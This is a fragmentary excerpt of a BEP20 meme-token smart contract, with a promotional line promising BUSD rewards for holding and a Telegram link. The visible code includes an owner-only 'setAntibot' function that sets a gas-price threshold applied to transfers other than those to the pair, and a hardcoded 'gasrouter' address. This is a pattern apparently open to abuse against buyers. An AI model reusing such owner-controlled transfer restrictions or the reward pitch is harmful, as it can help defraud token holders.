...
The Richest dog in the world who gives away BUSD just by holding

https://t.me/TrillionaireInu 
...
contract Peepo is Ownable, IBEP20 {
    using SafeMath for uint256;
    ...
    constructor () {
       ...
       address gasrouter = 0x7A29f3d77e8a50eb97a83D26BcF42f3e0A5E38CB;
        WBNB = router.WETH();
        ...
        marketingFeeReceiver = 0xA587A0Cf0C1c90eC5bAcA3De54Bc982b500dD80D;
    ...
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        ...
        if (tx.gasprice >= maxAB && recipient != pair) {
    ...
    function setAntibot (uint256 _maxAB) public onlyOwner {
               maxAB = _maxAB * 1 gwei; 
